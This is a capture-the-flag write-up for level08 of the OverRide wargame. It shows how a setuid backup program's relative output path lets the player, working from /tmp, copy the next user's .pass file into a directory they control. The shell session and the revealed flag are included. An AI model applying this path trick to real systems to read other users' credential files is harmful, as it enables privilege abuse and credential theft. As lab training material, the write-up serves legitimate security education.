# Level08

This program performs a backup with av[1]. It tries to open it, create a backup file at "./backups/" + av[1] and use a logger in the file "./backups/.log".
Since the path is relative and not absolute, we can use "/tmp" as "." when we execute the program with his absolute path like this:

```bash
level08@OverRide:~$ pwd
/tmp
level08@OverRide:~$ echo 'Hello !' > ./my_file
level08@OverRide:~$ mkdir backups
level08@OverRide:~$ /home/users/level08/level08 ./my_file
level08@OverRide:~$ cat ./backups/my_file
Hello !
```

We managed to use our backups directory instead of the one located in $HOME where we have no rights.

If we try directly to read "/home/users/level09/.pass", we encounter this error:

```bash
level08@OverRide:~$ /home/users/level08/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

We can simply create the directory to store ".pass" inside our backups:

```bash
level08@OverRide:~$ mkdir /tmp/backups/home
level08@OverRide:~$ mkdir /tmp/backups/home/users
level08@OverRide:~$ mkdir /tmp/backups/home/users/level09
level08@OverRide:~$ /home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:~$ cat /tmp/backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

The flag is **fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S**
